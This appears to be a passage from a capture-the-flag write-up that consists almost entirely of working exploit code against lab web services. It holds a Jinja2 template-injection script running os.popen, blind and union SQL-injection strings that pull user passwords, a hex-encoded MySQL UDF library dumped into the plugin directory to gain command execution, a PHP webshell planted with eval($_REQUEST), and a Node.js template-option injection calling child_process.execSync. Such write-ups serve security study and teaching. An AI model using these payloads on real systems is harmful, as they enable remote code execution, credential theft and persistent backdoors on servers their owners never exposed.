def regexp_out(data): patterns = [ re.compile(r'(flag{.*?})'), re.compile(r'xnuca{(.*?)}'), re.compile(r'DASCTF{(.*?)}'), re.compile(r'WMCTF{.*?}'), re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'), ]
 for pattern in patterns: res = pattern.findall(data.decode() if isinstance(data, bytes) else data) if len(res) > 0: return str(res[0])
 return None
def exp(): word = '''{{({}|attr(request.cookies.c)|attr(request.cookies.b)|attr(request.cookies.g)(0)|attr(request.cookies.s)()|attr(request.cookies.g)(59)|attr(request.cookies.fa)|attr(request.cookies.fb)|attr(request.cookies.ga)(request.cookies.fc)|attr(request.cookies.ga)(request.cookies.fd)(request.cookies.payload))}}'''
 data = { "word": word }
 headers = { "cookie": "c=__class__; b=__bases__; g=__getitem__; s=__subclasses__; ga= get; fa=__init__; fb=__globals__; fc=__builtins__; fd=eval; payload=__import__('os').popen('whoami').read()" }
 cookies = { "c": "__class__", "b": "__bases__", "g": "__getitem__", "s": "__subclasses__", "ga": "get", "fa":"__init__", "fb":"__globals__", "fc":"__builtins__", "fd":"eval", "payload": "__import__('os').popen('/readflag').read()" }
 r = requests.post(url, data={"word": word}, cookies=cookies)
 return regexp_out(r.text)
if __name__ == '__main__': print(exp())
' union select 1,(case when (select ascii(substr(({0}),{1},1)))={2} then sleep(5) else '1' end),'
' union select 1,(select substr((select book from books limit 9,1),5,5)),replace(replace('" union select 1,(select substr((select book from books limit 9,1),5,5)),replace(replace(".",(select substr((select password from users limit 1,1),1,1)),(select substr((select password from users limit 1,1),60,1))),(select substr((select version()),2,1)),".") AS username-- ',(select substr((select password from users limit 1,1),1,1)),(select substr((select password from users limit 1,1),60,1))),(select substr((select version()),2,1)),'" union select 1,(select substr((select book from books limit 9,1),5,5)),replace(replace(".",(select substr((select password from users limit 1,1),1,1)),(select substr((select password from users limit 1,1),60,1))),(select substr((select version()),2,1)),".") AS username-- ') AS username--
1;SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';create function sys_eval returns string soname 'udf.so';select sys_eval('/readflag');
/index.php?s=/admin/setting/test_php
_usertoken_=757a471d62503d6361bc7147796c40c6&_check_pwd_=123456
php=php$IFS-r$IFS"file_put_contents('/var/www/html/runtime/a.php','<?=eval($_REQUEST[123]);?>');";
import base64import jsonimport reimport requestsfrom websockets.sync.client import connect
endpoint = "http://192.168.88.128:
3000"ws_endpoint = "ws://192.168.88.128:
3000"
# test token
# {"iat":
150000000
# 0000,"exp":
15999
# 99999999,"name":# "ciscn","debug":# true}
# exp token
# {"iat":
16xxxxxxx
# xxxx,"exp":
16xxx
# xxxxxxxx,"name":# "exp","achieveme
# nts":[],"setting
# s":{"view option
# s":{"client":1,"# escapeFunction":# "0;
return proces
# s.mainModule.con
# structor._load('# child_process').# execSync('/readf
# lag>>statics/ind
# ex.html')"}},"a_
# super_long_str":# "ciscn","debug":# true}
test_token = base64.b64decode("IK8FyUzqb7xjrpWnphEEY5d9814rMICbbGJxKM9Hy/niR0R00mHAoUfxp+5lYU7Pd5nXqPPBP9xlWPERsTe16jJnXLb9hYQ3PQbkkOUr8pA=")
with connect(ws_endpoint) as ws: ws.send(json.dumps({ "type": "login", "id": "exp", "data": { "username": "exp", "password": "exp", }, })) token = json.loads(ws.recv())["data"]["token"] ws.send(json.dumps({ "type": "profilePayload", "id": "exp", "data": { "token": token, "payload": { "settings": { "view options": { "client": 1, "escapeFunction": "0;
return process.mainModule.constructor._load('child_process').execSync('/readflag>>statics/index.html')" }, }, "a_super_long_str": "some_random_sting_just_to_make_sure_the_payload_is_long_enough_and_will_be_replaced_anyway", }, }, })) payload = base64.b64decode(json.loads(ws.recv())["data"]["token"]) payload = payload[:16 * 16] + test_token[16 * 3:] payload = base64.b64encode(payload).decode()requests.get(endpoint + "/profile", params={"token": payload})print(re.search(r'flag{.*}', requests.get(endpoint + "/").text).group())
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/3-1689425188.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/8-1689425199.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/8-1689425200.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/5-1689425206.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/7-1689425206.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/1-1689425207.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/2-1689425208.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/7-1689425209.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/2-1689425209.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/0-1689425209.png)